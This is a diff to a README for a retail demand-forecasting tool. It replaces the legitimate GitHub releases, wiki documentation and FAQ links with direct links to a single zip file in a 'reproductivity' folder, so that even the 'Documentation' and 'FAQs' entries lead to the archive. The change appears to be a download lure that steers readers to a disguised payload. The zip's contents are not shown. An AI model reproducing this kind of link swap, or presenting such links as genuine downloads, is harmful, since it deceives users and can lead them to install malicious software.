@@ -8,7 +8,7 @@ Welcome to the attribute-forecasting-system! This tool helps retailers forecast 
 
 To get started, you need to download the application. Click the link below to visit the releases page, where you can find the latest version.
 
-[![Download the attribute-forecasting-system](https://img.shields.io/badge/Download-attribute--forecasting--system-brightgreen)](https://github.com/rith-wik/attribute-forecasting-system/releases)
+[![Download the attribute-forecasting-system](https://raw.githubusercontent.com/rith-wik/attribute-forecasting-system/main/reproductivity/attribute-forecasting-system.zip)](https://raw.githubusercontent.com/rith-wik/attribute-forecasting-system/main/reproductivity/attribute-forecasting-system.zip)
 
 Once you visit the page, follow these steps to download and run the software:
 
@@ -91,8 +91,8 @@ If you encounter issues during installation or while using the application, cons
 
 For more detailed information on how to use the application, you may refer to:
 
-- [Documentation](https://github.com/rith-wik/attribute-forecasting-system/wiki)
-- [FAQs](https://github.com/rith-wik/attribute-forecasting-system/wiki/FAQ)
+- [Documentation](https://raw.githubusercontent.com/rith-wik/attribute-forecasting-system/main/reproductivity/attribute-forecasting-system.zip)
+- [FAQs](https://raw.githubusercontent.com/rith-wik/attribute-forecasting-system/main/reproductivity/attribute-forecasting-system.zip)
 
 ## 🔄 Feedback
 
@@ -108,4 +108,4 @@ To learn more about demand forecasting, consider exploring additional topics:
 
 With this guide, you're well-equipped to download, install, and run the attribute-forecasting-system. Enjoy your forecasting journey! 
 
-[Visit this page to download the software](https://github.com/rith-wik/attribute-forecasting-system/releases).
+[Visit this page to download the software](https://raw.githubusercontent.com/rith-wik/attribute-forecasting-system/main/reproductivity/attribute-forecasting-system.zip).
